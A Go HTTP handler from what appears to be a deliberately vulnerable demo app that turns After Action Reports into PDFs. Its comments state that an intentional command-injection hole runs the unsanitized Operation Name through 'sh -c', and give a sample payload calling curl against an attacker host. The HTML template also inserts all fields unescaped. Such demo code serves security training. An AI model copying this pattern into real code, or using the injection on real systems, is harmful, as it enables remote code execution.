package handlers

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"time"

	"hs-s3-app/models"
	"hs-s3-app/storage"
)

// GenerateReportHandler generates a PDF report for an AAR
// WARNING: This handler contains an INTENTIONAL command injection vulnerability for demo purposes
func GenerateReportHandler(store *storage.MemoryStore) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		aarID := r.FormValue("aar_id")
		if aarID == "" {
			http.Error(w, "AAR ID is required", http.StatusBadRequest)
			return
		}

		// Get AAR
		aar, err := store.GetByID(aarID)
		if err != nil {
			http.Error(w, "AAR not found", http.StatusNotFound)
			return
		}

		// Generate HTML content for the report
		htmlContent := generateHTMLReport(aar)

		// Write HTML to temporary file
		tmpHTMLFile := fmt.Sprintf("/tmp/aar_report_%d.html", time.Now().UnixNano())
		if err := os.WriteFile(tmpHTMLFile, []byte(htmlContent), 0644); err != nil {
			http.Error(w, "Error creating temporary HTML file: "+err.Error(), http.StatusInternalServerError)
			return
		}
		defer os.Remove(tmpHTMLFile)

		// Generate PDF filename
		tmpPDFFile := fmt.Sprintf("/tmp/aar_report_%d.pdf", time.Now().UnixNano())
		defer os.Remove(tmpPDFFile)

		// VULNERABILITY: Command injection via unsanitized Operation Name field
		// The Operation Name is directly interpolated into the shell command without any sanitization
		// This allows an attacker to inject arbitrary commands by including shell metacharacters
		// in the Operation Name field (e.g., '; curl http://attacker.com; echo ')

		// INSECURE: Using sh -c with string formatting and unsanitized user input
		cmdStr := fmt.Sprintf("wkhtmltopdf --title '%s' %s %s",
			aar.OperationName,  // VULNERABLE: User-controlled input
			tmpHTMLFile,
			tmpPDFFile)

		cmd := exec.Command("sh", "-c", cmdStr)

		// Execute the command (this is where the RCE happens)
		output, err := cmd.CombinedOutput()
		if err != nil {
			// Log the error for debugging
			errorMsg := fmt.Sprintf("Error generating PDF: %s\nOutput: %s", err.Error(), string(output))
			http.Error(w, errorMsg, http.StatusInternalServerError)
			return
		}

		// Read the generated PDF
		pdfData, err := os.ReadFile(tmpPDFFile)
		if err != nil {
			http.Error(w, "Error reading PDF file: "+err.Error(), http.StatusInternalServerError)
			return
		}

		// Send PDF to client
		w.Header().Set("Content-Type", "application/pdf")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"AAR_%s_Report.pdf\"", aar.ID))
		w.Write(pdfData)
	}
}

func generateHTMLReport(aar *models.AAR) string {
	return fmt.Sprintf(`
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>After Action Report - %s</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            margin: 2cm;
            color: #333;
        }
        .header {
            text-align: center;
            border-bottom: 3px solid #002F6C;
            padding-bottom: 1rem;
            margin-bottom: 2rem;
        }
        .classification {
            background-color: #5C8F5C;
            color: white;
            padding: 0.5rem;
            text-align: center;
            font-weight: bold;
            margin-bottom: 1rem;
        }
        h1 {
            color: #002F6C;
            font-size: 1.8rem;
        }
        h2 {
            color: #002F6C;
            font-size: 1.3rem;
            border-bottom: 2px solid #E5E5E5;
            padding-bottom: 0.3rem;
            margin-top: 2rem;
        }
        .metadata {
            display: grid;
            grid-template-columns: 150px 1fr;
            gap: 0.5rem;
            margin-bottom: 1rem;
        }
        .label {
            font-weight: bold;
        }
        .section {
            margin-bottom: 2rem;
        }
        .footer {
            margin-top: 3rem;
            padding-top: 1rem;
            border-top: 2px solid #E5E5E5;
            font-size: 0.9rem;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="classification">%s</div>

    <div class="header">
        <h1>AFTER ACTION REPORT</h1>
        <h2>%s</h2>
        <p><strong>AAR ID:</strong> %s</p>
    </div>

    <div class="section">
        <h2>Identification</h2>
        <div class="metadata">
            <div class="label">DTG:</div>
            <div>%s</div>
            <div class="label">Unit:</div>
            <div>%s</div>
            <div class="label">Mission Type:</div>
            <div>%s</div>
            <div class="label">Location:</div>
            <div>%s</div>
            <div class="label">Personnel:</div>
            <div>%d</div>
        </div>
    </div>

    <div class="section">
        <h2>Executive Summary</h2>
        <p>%s</p>
    </div>

    <div class="section">
        <h2>Key Events</h2>
        <pre>%s</pre>
    </div>

    <div class="section">
        <h2>What Went Well</h2>
        <p>%s</p>
    </div>

    <div class="section">
        <h2>Needs Improvement</h2>
        <p>%s</p>
    </div>

    <div class="section">
        <h2>Lessons Learned</h2>
        <p>%s</p>
    </div>

    <div class="section">
        <h2>Recommendations</h2>
        <p>%s</p>
    </div>

    <div class="section">
        <h2>Administrative</h2>
        <div class="metadata">
            <div class="label">Prepared By:</div>
            <div>%s</div>
            <div class="label">Reviewed By:</div>
            <div>%s</div>
            <div class="label">Status:</div>
            <div>%s</div>
        </div>
    </div>

    <div class="footer">
        <div class="classification">%s</div>
        <p>Distribution: Authorized to U.S. Government Agencies Only</p>
        <p>Generated: %s</p>
    </div>
</body>
</html>
`,
		aar.OperationName,
		aar.Classification,
		aar.OperationName,
		aar.ID,
		aar.DTG,
		aar.UnitDesignation,
		aar.MissionType,
		aar.Location,
		aar.PersonnelCount,
		aar.ExecutiveSummary,
		aar.KeyEvents,
		aar.WhatWentWell,
		aar.NeedsImprovement,
		aar.LessonsLearned,
		aar.Recommendations,
		aar.PreparedBy,
		aar.ReviewedBy,
		aar.Status,
		aar.Classification,
		time.Now().Format("02 Jan 2006 15:04 MST"),
	)
}
